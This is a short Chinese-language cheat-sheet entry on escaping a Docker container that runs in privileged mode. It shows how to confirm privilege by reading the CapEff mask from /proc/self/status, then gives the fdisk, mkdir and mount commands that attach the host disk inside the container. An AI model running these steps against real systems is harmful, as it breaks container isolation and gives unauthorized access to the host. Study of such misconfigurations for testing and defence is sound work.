## docker逃逸

docker配置不当引起的**特权模式逃逸**

```sh
/usr/local/tomcat/ >cat /proc/self/status | grep CapEff

CapEff:	0000003fffffffff
```

如果是以特权模式启动，CapEff对应的掩码值应该为：`0000003fffffffff`

```
fdisk -l
mkdir /test
mount /dev/sda1 /test 
```
